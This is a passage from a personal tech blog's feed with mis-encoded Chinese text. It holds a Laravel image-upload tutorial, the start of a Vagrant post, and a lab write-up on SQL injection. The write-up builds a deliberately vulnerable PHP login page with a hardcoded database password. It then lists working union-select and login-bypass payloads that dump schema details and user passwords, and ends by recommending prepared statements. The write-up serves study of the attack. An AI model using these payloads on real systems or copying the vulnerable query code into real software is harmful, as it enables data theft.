src="/images/2017-7-10-21-20.png" alt="Pic"></p><p><img src="/images/2017-7-10-21-21.png" alt="Pic"></p><p>å¯èƒ½ä½ ä¼šå‘ç°ä½ çš„ä¸‹æ‹‰å›¾ç‰‡æŒ‰é’®é‡Œé¢å¹¶æ²¡æœ‰ä¸Šä¼ å›¾ç‰‡çš„é€‰é¡¹ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦å¼•ç”¨ä¸€ä¸‹å›¾ç‰‡ä¸Šä¼ çš„æ’ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶è¦åœ¨ä¸Šé¢çš„jsæ–‡ä»¶ä¹‹åå¼•å…¥</p><pre><code class="html">&lt;script src=&quot;/Trumbowyg/dist/plugins/upload/trumbowyg.upload.js&quot;&gt;&lt;/script&gt;</code></pre><p>æ¥ä¸‹ä¿©ä»‹ç» plugins upload é‡Œé¢çš„å‡ ä¸ªå‚æ•°</p><ul><li>serverPath : æ–‡ä»¶ä¸Šä¼  Controller çš„è·¯å¾„ï¼Œç”¨äºåå°å¤„ç†ä¸Šä¼ å›¾ç‰‡</li><li>fileFieldName : åå°æ¥æ”¶æ–‡ä»¶çš„åå­—ï¼Œä¹Ÿå°±æ˜¯ <code>&lt;input name=&#39;upload&#39;&gt;</code></li><li>usage : æ˜¯æµ·ç—´è‡ªå·±åŠ ä¸Šçš„ï¼Œç”¨äºåˆ¤æ–­ä¸Šä¼ æ¥æºï¼Œæ–¹ä¾¿ç®¡ç†ï¼Œè¿™ä¸ªä¸æ˜¯å®˜æ–¹å‚æ•°ï¼Œéœ€è¦è‡ªå·±ä¿®æ”¹ js æºç </li></ul><h2 id="upload">æ–‡ä»¶ä¸Šä¼ ï¼ˆLaravelï¼‰</h2><p>æ¥ä¸‹æ¥éœ€è¦å®šä¹‰åå°ä»£ç ï¼Œè¿™é‡Œä½¿ç”¨Laravel 5.4æ¡†æ¶ã€‚</p><p>é…ç½®æ–‡ä»¶ï¼š<code>config/imageUpload.php</code></p><pre><code class="php">&lt;?php/** * Created by PhpStorm. * User: liebes * Date: 2017/7/10 * Time: ä¸‹åˆ3:42 */$imageExtensions = [    &#39;png&#39;, &#39;jpeg&#39;, &#39;jpg&#39;, &#39;bmp&#39;];return [    &#39;max_size&#39; =&gt; 1024 * 1024 * 5,  // default 5MB    &#39;rules&#39; =&gt; [        &#39;notice&#39; =&gt; [            &#39;path&#39; =&gt; &#39;notification&#39;,            &#39;extensions&#39; =&gt; $imageExtensions,            &#39;disk&#39; =&gt; &#39;public&#39;,            &#39;max_size&#39; =&gt; 1024 * 1024 * 50        ],    ]];</code></pre><p>è¿™ä¸ªé…ç½®æ–‡ä»¶å®šä¹‰äº†å›¾ç‰‡ä¸Šä¼ å¤§å°ï¼Œå›¾ç‰‡åç¼€ï¼Œå›¾ç‰‡æ‰€å±ç­‰ç­‰ä¿¡æ¯ï¼Œå¯ä»¥è‡ªç”±å®šä¹‰</p><p>Controller æ–‡ä»¶ <code>FileController.class.php</code></p><pre><code class="php">&lt;?phpnamespace App\Http\Controllers\Manager;use App\Http\Helpers\Resources;use Illuminate\Http\Request;use App\Http\Controllers\Controller;use App\Models\Image;use Illuminate\Support\Facades\Config;use Mockery\Exception;class FileController extends Controller{    // å›¾ç‰‡ä¸Šä¼ é…ç½®æ–‡ä»¶    protected $config;    // ä¸Šä¼ è§„åˆ™    protected $rules;    public function __construct()    {        $this-&gt;config = config(&#39;imageUpload&#39;);        $this-&gt;rules = array_keys(config(&#39;imageUpload.rules&#39;));    }    /**     * å›¾ç‰‡ä¸Šä¼ æ–¹æ³•ï¼Œé…ç½®å‚è§config.ImageUpload     * @param Request $request     * @return \Illuminate\Http\JsonResponse     */    public function upload(Request $request){        $usage = $request-&gt;input(&#39;usage&#39;);        if(empty($usage) || !$this-&gt;checkUsage($usage)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;è§„åˆ™ä¸ç¬¦&#39;            ]);        }        if(!$request-&gt;hasFile(&#39;upload&#39;)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;ä¸Šä¼ å¤±è´¥&#39;            ]);        }        $file = $request-&gt;file(&#39;upload&#39;);        $size = $file-&gt;getSize();        $extension = $file-&gt;extension();        if(!$this-&gt;checkExtension($extension, $usage)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;æ–‡ä»¶ç±»å‹ä¸ç¬¦&#39;            ]);        }        if(!$this-&gt;checkFileSize($size, $usage)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;æ–‡ä»¶ä¸èƒ½å¤§äº5M&#39;            ]);        }        $name = $file-&gt;hashName();        $disk = $this-&gt;config[&#39;rules&#39;][$usage][&#39;disk&#39;];        $path = $file-&gt;store($this-&gt;config[&#39;rules&#39;][$usage][&#39;path&#39;], $disk);        $image = Image::createImg([            &#39;name&#39;  =&gt; $name,            &#39;size&#39;  =&gt; $size,            &#39;extension&#39; =&gt; $extension,            &#39;path&#39;  =&gt; $path        ]);        return response()-&gt;json([            &#39;success&#39; =&gt; true,            &#39;file&#39; =&gt; config(&#39;filesystems.disks.&#39;.$disk.&#39;.url&#39;).&#39;/&#39;.$path,            &#39;info&#39; =&gt; $image,        ]);    }    /**     * @param $usage     * @return bool     */    protected function checkUsage($usage){        return in_array($usage, $this-&gt;rules);    }    /**     * @param $extension     * @param $usage     * @return bool     */    protected function checkExtension($extension, $usage){        return in_array($extension, $this-&gt;config[&#39;rules&#39;][$usage][&#39;extensions&#39;]);    }    /**     * @param $size     * @param $usage     * @return bool     */    protected function checkFileSize($size, $usage){        $max_size = $this-&gt;config[&#39;rules&#39;][$usage][&#39;max_size&#39;] ?? $this-&gt;config[&#39;max_size&#39;];        return $size &lt; $max_size;    }}</code></pre><p>ä¹‹ååœ¨è·¯ç”±é‡Œé¢é…ç½®å¥½è·¯ç”±ï¼Œå³å¯ã€‚</p><pre><code class="php">Route::post(&#39;file&#39;, &#39;FileController@upload&#39;);</code></pre><p>ç”±äºè¿™é‡Œåšäº†usageçš„æ£€æµ‹ï¼Œæ‰€ä»¥éœ€è¦åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™åŠ ä¸Šusageè¿™ä¸ªå±æ€§ï¼Œéœ€è¦ä¿®æ”¹jsæ–‡ä»¶å¦‚ä¸‹</p><p><code>trumbowyg.upload.js</code></p><pre><code class="javascript">plugins: {    upload: {        init: function (trumbowyg) {            trumbowyg.o.plugins.upload = $.extend(true, {}, defaultOptions, trumbowyg.o.plugins.upload || {});            var btnDef = {                fn: function () {                    trumbowyg.saveRange();                    var file,                        usage = trumbowyg.o.plugins.upload.usage,                        prefix = trumbowyg.o.prefix;                    var $modal = trumbowyg.openModalInsert(                  Â·Â·Â·Â·Â·Â·Â·Â·Â·</code></pre><p>åœ¨è¿™é‡ŒåŠ ä¸Šusageå‚æ•°</p><p><code>trumbowyg.upload.js</code></p><pre><code class="javascript">// Callbackfunction (values) {    var data = new FormData();    data.append(trumbowyg.o.plugins.upload.fileFieldName, file);    data.append(&quot;usage&quot;, usage);    trumbowyg.o.plugins.upload.data.map(function (cur) {        data.append(cur.name, cur.value);    });</code></pre><p>åœ¨æäº¤çš„Formè¡¨å•é‡ŒåŠ ä¸Šusageçš„å‚æ•°</p><p>ä¿®æ”¹ä»¥ä¸Šä¸¤å¤„å³å¯</p><p>å½“ç„¶åœ¨æäº¤çš„æ—¶å€™å¯èƒ½ä¼šå‡ºç°csrftoken miss match çš„é—®é¢˜ï¼Œå‚è€ƒLaravelæ–‡æ¡£</p><p><a href="http://d.laravel-china.org/docs/5.4/csrf#csrf-x-csrf-token" target="_blank" rel="noopener">Laravel ä¸‹çš„ä¼ªé€ è·¨ç«™è¯·æ±‚ä¿æŠ¤ CSRF</a></p><p>åœ¨htmlç•Œé¢å¤´åŠ ä¸Š meta å±æ€§</p><pre><code class="html">&lt;meta name=&quot;csrf-token&quot; content=&quot;{{ csrf_token() }}&quot;&gt;</code></pre><p>åŒæ—¶åœ¨è°ƒç”¨ajaxæ–¹æ³•ä¹‹å‰ï¼Œè¿›è¡Œè®¾ç½®</p><pre><code class="javascript">&lt;script&gt;    $.ajaxSetup({        headers: {            &#39;X-CSRF-TOKEN&#39;: $(&#39;meta[name=&quot;csrf-token&quot;]&#39;).attr(&#39;content&#39;)        }    });&lt;/script&gt;</code></pre><p>ä»¥ä¸Šå°±æ˜¯å…¨éƒ¨çš„ä½¿ç”¨Trumbowygç¼–è¾‘å™¨ä¸laravelæ–‡ä»¶ä¸Šä¼ çš„å…¨éƒ¨</p><p>æœ€åï¼Œåæ§½ä¸€ä¸‹ckeditorï¼Œä¸«æŠŠæ‰€æœ‰çš„æ–‡ä»¶ä¸Šä¼ ç•Œé¢éƒ½å®šä¹‰åœ¨ä¸€ä¸ªiframeé‡Œï¼Œä¸æ˜¯å¼‚æ­¥é€’äº¤ï¼Œåˆ°æ­»æˆ‘éƒ½æ²¡è§£å†³å‡ºæ¥csrftokençš„é—®é¢˜ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å‡æœŸå†™ä»£ç ï¼Œæ•´ç†ä¸€äº›å…³äºEditorï¼Œæ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#editor&quot;&gt;editor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#upload&quot;&gt;æ–‡ä»¶ä¸Šä¼ ï¼ˆLaravelï¼‰&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;e
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥å¿—" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="editor" scheme="https://blog.liebes.top/tags/editor/"/>
    
      <category term="æ–‡ä»¶ä¸Šä¼ " scheme="https://blog.liebes.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SQL injection å­¦ä¹ </title>
    <link href="https://blog.liebes.top/2017/05/22/web-security-2/"/>
    <id>https://blog.liebes.top/2017/05/22/web-security-2/</id>
    <published>2017-05-22T02:37:43.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨å›½å“¥çš„å®‰æ’ä¸‹ï¼Œå¯¹ç€ kaliæ¸—é€æµ‹è¯•ä¹‹ SQL injeciton è§†é¢‘æ•™ç¨‹ä¸€é¡¿æ’¸ï¼ˆè™½ç„¶æ²¡ä»€ä¹ˆåµç”¨ï¼‰ï¼Œè®°å½•ä¸‹æ¥è‡ªå·±çš„ä¸€äº›å®éªŒè¿‡ç¨‹å’Œç»å†ã€‚</p><h2 id="æå‰å‡†å¤‡"><a href="#æå‰å‡†å¤‡" class="headerlink" title="æå‰å‡†å¤‡"></a>æå‰å‡†å¤‡</h2><ul><li>æœ¬åœ°çš„ lemp ç¯å¢ƒï¼Œæ­å»ºå¯å‚è€ƒï¼š<a href="https://wanghaichi.github.io/2017/01/21/lempServer/" target="_blank" rel="noopener">Centos 7 Nginx + php + mysql WebæœåŠ¡å™¨æ­å»º</a> å’Œ <a href="https://wanghaichi.github.io/2017/03/10/lemp-Ubantu/" target="_blank" rel="noopener">Unbuntu16.04 Nginx + php + mysql WebæœåŠ¡å™¨æ­å»º</a> å½“ç„¶ xampp ä¹Ÿæ˜¯æå¥½çš„ã€‚</li><li>ç”¨äºæ”»å‡»çš„ php è„šæœ¬å’Œæ•°æ®åº“ï¼Œä¸‹é¢ä¼šç»™å‡º</li></ul><h2 id="ç¼–å†™è„šæœ¬"><a href="#ç¼–å†™è„šæœ¬" class="headerlink" title="ç¼–å†™è„šæœ¬"></a>ç¼–å†™è„šæœ¬</h2><p>æ‰¾ä¸ªèƒ½å¤Ÿè®¿é—®çš„åœ°æ–¹ï¼Œç¼–å†™å¦‚ä¸‹ php è„šæœ¬</p><pre><code class="php">&lt;html&gt;    &lt;head&gt;&lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;./login.php&quot; method=&quot;post&quot;&gt;            ID&lt;input name=&quot;id&quot; type=&quot;text&quot;&gt;&lt;br/&gt;            &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;        &lt;/form&gt;        &lt;div&gt;        &lt;p&gt;            &lt;?php                if($_POST[&#39;id&#39;]){                    $connection = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;hhxxttxs&quot;, &quot;test&quot;);                    if($connection-&gt;connect_errno){                         echo &quot;Failed to connect to MySQL: (&quot; . $connection-&gt;connect_errno . &quot;) &quot; . $connection-&gt;connect_error;                    }                    $id = $_POST[&#39;id&#39;];                    // echo $name.&quot;&lt;br/&gt;&quot;.$password.&quot;&lt;br/&gt;&quot;;                    $sql = &quot;SELECT name, password FROM `user` WHERE `id` = &#39;&quot;. $id . &quot;&#39;&quot;;                    echo $sql.&quot;&lt;br/&gt;&quot;;                    $res = $connection-&gt;query($sql);                    // var_dump($res);                    while($row = $res-&gt;fetch_assoc() ){                        echo &quot;å§“å: &quot;. $row[&#39;name&#39;] . &quot;&lt;br/&gt;&quot;;                        echo &quot;å¯†ç : &quot;. $row[&#39;password&#39;] . &quot;&lt;br/&gt;&quot;;                    }                }            ?&gt;        &lt;/p&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>åœ¨æœ¬åœ°æ–°å»ºæ•°æ®åº“ <code>test</code>ï¼Œæ–°å»º user è¡¨</p><p><img src="/images/2017-5-22-10-45.png" alt="Picture"></p><h2 id="SQL-injection-ç®€ä»‹"><a href="#SQL-injection-ç®€ä»‹" class="headerlink" title="SQL injection ç®€ä»‹"></a>SQL injection ç®€ä»‹</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><blockquote><p>æœåŠ¡å™¨ç«¯ç¨‹åºå°†ç”¨æˆ·è¾“å…¥å‚æ•°ä½œä¸ºå‚æ•°ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ï¼Œç›´æ¥æ‹¼æ¥SQLè¯­å¥ï¼Œå¹¶å°†æŸ¥è¯¢ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯æµè§ˆå™¨</p></blockquote><p>å¯¹äºä¸€èˆ¬å¤„ç†æ•°æ®åº“æŸ¥è¯¢çš„è¯­å¥ï¼Œå®¢æˆ·ç«¯ä¼šå°†ç”¨æˆ·è¾“å…¥çš„å‚æ•°ä½¿ç”¨<code>&#39;&#39;</code>åŒ…è£¹ä¹‹åï¼Œå½¢æˆ SQL æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œäº¤ç»™ SQL æœåŠ¡å»å¤„ç†ã€‚å¯¹äºæ²¡æœ‰è¿›è¿‡æ•°æ®å¤„ç†çš„è„šæœ¬ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿ SQL æ³¨å…¥ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨è¾“å…¥ <code>&#39; &quot; % ( )</code>è¿™äº›åœ¨ SQL è¯­æ³•ä¸­æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼Œè¿›è¡Œ SQL æ³¨å…¥æ”»å‡»ã€‚</p><h3 id="ç”¨æˆ·ç™»å½•åˆ¤æ–­"><a href="#ç”¨æˆ·ç™»å½•åˆ¤æ–­" class="headerlink" title="ç”¨æˆ·ç™»å½•åˆ¤æ–­"></a>ç”¨æˆ·ç™»å½•åˆ¤æ–­</h3><ul><li><code>SELECT * FROM users WHERE user=&#39;uname&#39; AND password=&#39;pass&#39;</code></li><li><code>SELECT * FROM users WHERE user=&#39;name&#39; AND password=&#39;&#39; OR &#39;&#39;=&#39;&#39;</code></li></ul><p>é€šè¿‡ä»¥ä¸Šè¯­å¥å¯ä»¥è·³è¿‡ç”¨æˆ·éªŒè¯ï¼Œå› ä¸ºç¬¬äºŒä¸ª SQL è¯­å¥æ’ä¸ºçœŸã€‚</p><h3 id="æ‰‹åŠ¨æ¼æ´æŒ–æ˜â€“SQLæ³¨å…¥"><a href="#æ‰‹åŠ¨æ¼æ´æŒ–æ˜â€“SQLæ³¨å…¥" class="headerlink" title="æ‰‹åŠ¨æ¼æ´æŒ–æ˜â€“SQLæ³¨å…¥"></a>æ‰‹åŠ¨æ¼æ´æŒ–æ˜â€“SQLæ³¨å…¥</h3><p>æ³¨æ„ä¸‹é¢çš„æ‰€æœ‰äº‹ä¾‹ä¸­ + è¡¨ç¤ºç©ºæ ¼ï¼Œä¸åŠ ç©ºæ ¼ <code>--</code> èµ·ä¸äº†æ³¨é‡Šçš„ä½œç”¨ã€‚</p><h4 id="åŸºäºæŠ¥é”™çš„æ£€æµ‹æ–¹æ³•"><a href="#åŸºäºæŠ¥é”™çš„æ£€æµ‹æ–¹æ³•" class="headerlink" title="åŸºäºæŠ¥é”™çš„æ£€æµ‹æ–¹æ³•"></a>åŸºäºæŠ¥é”™çš„æ£€æµ‹æ–¹æ³•</h4><ul><li><code>&#39; &quot; % ( )</code></li></ul><h4 id="åŸºäºå¸ƒå°”çš„æ£€æµ‹"><a href="#åŸºäºå¸ƒå°”çš„æ£€æµ‹" class="headerlink" title="åŸºäºå¸ƒå°”çš„æ£€æµ‹"></a>åŸºäºå¸ƒå°”çš„æ£€æµ‹</h4><ul><li><code>1&#39; and &#39;1&#39;=&#39;1</code>   /   <code>1&#39; and &#39;1</code></li><li><code>1&#39; and &#39;1&#39;=&#39;1</code>   /   <code>1&#39; and &#39;0</code></li></ul><h4 id="è¡¨åˆ—æ•°-æ˜¾ç¤ºä¿¡æ¯ä½äºå“ªä¸€åˆ—"><a href="#è¡¨åˆ—æ•°-æ˜¾ç¤ºä¿¡æ¯ä½äºå“ªä¸€åˆ—" class="headerlink" title="è¡¨åˆ—æ•° / æ˜¾ç¤ºä¿¡æ¯ä½äºå“ªä¸€åˆ—"></a>è¡¨åˆ—æ•° / æ˜¾ç¤ºä¿¡æ¯ä½äºå“ªä¸€åˆ—</h4><ul><li><code>&#39; order by 9--+</code></li><li>select * æ—¶è¡¨å­—æ®µæ•°=æŸ¥è¯¢å­—æ®µæ•°</li></ul><p>å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•åˆ¤æ–­å½“å‰è¡¨ä¸­æœ‰å¤šå°‘åˆ—ï¼Œä½†éœ€è¦è„šæœ¬ä¸­çš„ SQL è¯­å¥ä½¿ç”¨ <code>*</code> ä½œä¸ºæŸ¥è¯¢åŸŸ</p><h4 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h4><ul><li><code>&#39; union select 1,2--+</code></li></ul><p><img src="/images/2017-5-22-10-35.png" alt="Picture"></p><ul><li><code>&#39; union all select database(),2--+</code> // æ˜¾ç¤ºæ•°æ®åº“å</li></ul><p><img src="/images/2017-5-22-10-36.png" alt="Picture"></p><ul><li><code>&#39; union all select user(), version()--+</code> // æ˜¾ç¤ºç”¨æˆ·ï¼Œæ•°æ®åº“ç‰ˆæœ¬</li></ul><p><img src="/images/2017-5-22-11-02.png" alt="Picture"></p><ul><li><code>&#39; union select database(), substring_index(USER(),&quot;@&quot;,1)--</code></li></ul><p><img src="/images/2017-5-22-11-04.png" alt="Picture">;</p><h4 id="å…¨å±€å‡½æ•°"><a href="#å…¨å±€å‡½æ•°" class="headerlink" title="å…¨å±€å‡½æ•°"></a>å…¨å±€å‡½æ•°</h4><ul><li><code>@@datadir @@hostname @@VERSION @@version_compile_os--+</code></li></ul><p><img src="/images/2017-5-22-11-09.png" alt="Picture"></p><p><img src="/images/2017-5-22-11-10.png" alt="Picture"></p><p><img src="/images/2017-5-22-11-11.png" alt="Picture"></p><h4 id="å½“å‰åº“"><a href="#å½“å‰åº“" class="headerlink" title="å½“å‰åº“"></a>å½“å‰åº“</h4><ul><li><code>database()</code></li></ul><h4 id="ASCIIè½¬å­—ç¬¦"><a href="#ASCIIè½¬å­—ç¬¦" class="headerlink" title="ASCIIè½¬å­—ç¬¦"></a>ASCIIè½¬å­—ç¬¦</h4><ul><li><code>char()</code></li></ul><p>char å‡½æ•°å¯ä»¥å°† ascii ç è½¬æ¢æˆå¯¹åº”çš„å­—ç¬¦ã€‚</p><h4 id="è¿æ¥å­—ç¬¦ä¸²"><a href="#è¿æ¥å­—ç¬¦ä¸²" class="headerlink" title="è¿æ¥å­—ç¬¦ä¸²"></a>è¿æ¥å­—ç¬¦ä¸²</h4><ul><li><code>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</code></li></ul><p><img src="/images/2017-5-22-11-14.png" alt="Picture"></p><p>è¿™é‡Œä½¿ç”¨ CONCAT_WS å‡½æ•°ï¼Œå°†ä¸‰ä¸ªæ•°æ®åº“ä¿¡æ¯æ‹¼æ¥åœ¨ä¸€èµ·ï¼ŒåŒæ—¶ä½¿ç”¨ <code>:</code> è¿›è¡Œåˆ†å‰²ã€‚</p><h4 id="è®¡ç®—å“ˆå¸Œ"><a href="#è®¡ç®—å“ˆå¸Œ" class="headerlink" title="è®¡ç®—å“ˆå¸Œ"></a>è®¡ç®—å“ˆå¸Œ</h4><ul><li><code>md5()</code></li></ul><p>å¯ä»¥ä½¿ç”¨ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œå¤§è§„æ¨¡çš„æ•°æ®è®¡ç®—</p><h4 id="Mysql-æ•°æ®ç»“æ„"><a href="#Mysql-æ•°æ®ç»“æ„" class="headerlink" title="Mysql æ•°æ®ç»“æ„"></a>Mysql æ•°æ®ç»“æ„</h4><ul><li>information_schema</li></ul><h4 id="æ‰€æœ‰åº“æ‰€æœ‰è¡¨-ç»Ÿè®¡åº“ä¸­è¡¨çš„æ•°é‡"><a href="#æ‰€æœ‰åº“æ‰€æœ‰è¡¨-ç»Ÿè®¡åº“ä¸­è¡¨çš„æ•°é‡" class="headerlink" title="æ‰€æœ‰åº“æ‰€æœ‰è¡¨ / ç»Ÿè®¡åº“ä¸­è¡¨çš„æ•°é‡"></a>æ‰€æœ‰åº“æ‰€æœ‰è¡¨ / ç»Ÿè®¡åº“ä¸­è¡¨çš„æ•°é‡</h4><ul><li><code>&#39; union select table_name, table_schema from information_schema.tables--+</code></li></ul><p><img src="/images/2017-5-22-11-17.png" alt="Picture"></p><ul><li><code>&#39; union select table_schema,count(*) FROM information_schema.tables group by table_schema --</code></li></ul><p><img src="/images/2017-5-22-11-23.png" alt="Picture"></p><h4 id="teståº“ä¸­çš„è¡¨å"><a href="#teståº“ä¸­çš„è¡¨å" class="headerlink" title="teståº“ä¸­çš„è¡¨å"></a>teståº“ä¸­çš„è¡¨å</h4><ul><li><code>&#39; union select table_name, table_schema from information_schema.tables where table_schema=&#39;test&#39;--+</code></li></ul><p><img src="/images/2017-5-22-11-26.png" alt="Picture"></p><h4 id="Usersè¡¨ä¸­çš„æ‰€æœ‰åˆ—ï¼ˆuser-id-first-name-last-name-user-password-avatarï¼‰"><a href="#Usersè¡¨ä¸­çš„æ‰€æœ‰åˆ—ï¼ˆuser-id-first-name-last-name-user-password-avatarï¼‰" class="headerlink" title="Usersè¡¨ä¸­çš„æ‰€æœ‰åˆ—ï¼ˆuser_id first_name last_name user password avatarï¼‰"></a>Usersè¡¨ä¸­çš„æ‰€æœ‰åˆ—ï¼ˆuser_id first_name last_name user password avatarï¼‰</h4><ul><li><code>&#39; union select table_name, column_name from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;user&#39;--+</code></li></ul><p><img src="/images/2017-5-22-11-27.png" alt="Picture"></p><p>å¯ä»¥çœ‹åˆ° user è¡¨ä¸­çš„æ‰€æœ‰åˆ—åéƒ½è¢«åˆ—å‡ºæ¥äº†ï¼</p><h4 id="æŸ¥è¯¢-user-password-åˆ—çš„å†…å®¹"><a href="#æŸ¥è¯¢-user-password-åˆ—çš„å†…å®¹" class="headerlink" title="æŸ¥è¯¢ user password åˆ—çš„å†…å®¹"></a>æŸ¥è¯¢ user password åˆ—çš„å†…å®¹</h4><ul><li><code>&#39; union select name, password from test.user--+</code></li></ul><p><img src="/images/2017-5-22-11-29.png" alt="Picture"></p><ul><li><code>&#39; union select null, concat(name, 0x3a, password) from user--+</code></li></ul><p><img src="/images/2017-5-22-11-30.png" alt="Picture"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç®€å•çš„ SQL injection æ¼æ´ï¼Œå‡ ä¹å¯ä»¥æ”»å‡»æ‰€æœ‰çš„æ•°æ®åº“ã€‚æ›´æœ‰ç”šè€…è¿˜å¯ä»¥ç›´æ¥æ”»å‡»æœåŠ¡å™¨ï¼ˆä¸‹å›è¯´ï¼‰ã€‚å› æ­¤åœ¨ç¼–å†™ä»£ç æ—¶ä¸€å®šè¦æ³¨æ„ SQL è¯­å¥çš„è¿‡æ»¤ã€‚</p><p>ç›®å‰çœ‹æ¥ï¼Œæ‰€æœ‰çš„è¿‡æ»¤æ‰‹æ®µéƒ½æ˜¯ä¸å¯é çš„ï¼Œéƒ½æœ‰æ–¹æ³•å¯ä»¥é€šè¿‡æˆªæ–­ã€æ¬ºéª—ç­‰è¿›è¡Œæ”»å‡»ã€‚å› æ­¤æ­£ç¡®çš„æ“ä½œåº”è¯¥æ˜¯ç”¨ SQL é¢„ç¼–è¯‘ï¼Œè¿›è¡Œå‚æ•°ç»‘å®šï¼Œè¿™æ ·å¯ä»¥ä¿è¯ SQL çš„æŸ¥è¯¢è¯­å¥ä¸è¢«ç¯¡æ”¹ã€‚å…·ä½“æ–¹æ³•å¯ä»¥å‚è§ <a href="http://php.net/manual/zh/mysqli.quickstart.prepared-statements.php" target="_blank" rel="noopener">mysqli Prepared Statements</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;åœ¨å›½å“¥çš„å®‰æ’ä¸‹ï¼Œå¯¹ç€ kaliæ¸—é€æµ‹è¯•ä¹‹ SQL injeciton è§†é¢‘æ•™ç¨‹ä¸€é¡¿æ’¸ï¼ˆè™½ç„¶æ²¡ä»€ä¹ˆåµç”¨ï¼‰ï¼Œè®°å½•ä¸‹æ¥è‡ªå·±çš„ä¸€äº›å®éªŒè¿‡ç¨‹å’Œç»å†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;æå‰å‡†å¤‡&quot;&gt;&lt;a href=&quot;#æå‰å‡†å¤‡&quot; class=&quot;headerlink&quot; title=&quot;æå‰å‡†å¤‡&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="å®‰å…¨" scheme="https://blog.liebes.top/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="https://blog.liebes.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql injection" scheme="https://blog.liebes.top/tags/sql-injection/"/>
    
  </entry>
  
  <entry>
    <title>Vagrant ï¼š Windowsä¸‹å¼€å‘å°åŠ©æ‰‹ï¼Œå‘Šåˆ«åŒç³»ç»Ÿ</title>
    <link href="https://blog.liebes.top/2017/05/17/vagrant-windows-init/"/>
    <id>https://blog.liebes.top/2017/05/17/vagrant-windows-init/</id>
    <published>2017-05-17T03:29:56.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸çŸ¥é“å¹¿å¤§ç¨‹åºå‘˜ä»¬æ˜¯æ€ä¹ˆå¤„ç† Windows å’Œ Linux çš„ï¼Œæœ€å¼€å§‹åœ¨ Windows ä¸‹é¢è·‘ Linux çš„è™šæ‹Ÿæœºï¼Œå¡çš„è‡ªå·±æ€€ç–‘äººç”Ÿã€‚åæ¥åšäº†ä¸ªåŒç³»ç»Ÿï¼Œè‡ªå·± 250 çš„å›ºæ€è¡¨ç¤ºæ ¹æœ¬ä¸å¤Ÿç”¨ï¼Œè€Œä¸”åŠ¨ä¸åŠ¨å…³æœºé‡å¯ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆï¼Œæ¯•ç«Ÿ office å‰²èˆä¸äº†ã€‚åæ¥ä¸€ä¸ªå­¦é•¿ç‚¹äº†æˆ‘ä¸€ä¸‹ï¼Œæ—¢ç„¶æƒ³ç”¨ Linux æäº‹æƒ…ï¼Œç”¨ä»€ä¹ˆå›¾å½¢åŒ–ç•Œé¢ï¼Œæä¸ªæœåŠ¡å™¨ä¸å°±å¥½äº†ã€‚ç„¶åæˆ‘å°±æäº†ä¸ªè…¾è®¯äº‘ï¼Œç„¶è€Œï¼Œç½‘ç»œä¸å¥½çš„æ—¶å€™çœŸçš„è›‹ç–¼ã€‚æœ€åï¼Œåœ¨å®å“¥å¤§è…¿çš„æŒ‡å¼•ä¸‹ï¼Œå°è¯•äº†ä¸€ä¸‹ Vagrant è™šæ‹Ÿæœºï¼Œå¿«çš„é£èµ·ï¼Œæœæ–­æ”¾å¼ƒåŒç³»ç»Ÿã€‚</p><p>è¿™é‡Œè®°å½•ä¸€äº›è‡ªå·±åœ¨æ­å»º Vagrant ç¯å¢ƒæ—¶çš„æ­¥éª¤ä»¥åŠè¸©çš„å‘ã€‚</p><p>æå‰å‡†å¤‡ï¼š</p><ul><li><a href="https://www.vagrantup.com/" target="_blank" rel="noopener">Vagrant</a></li><li><a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" 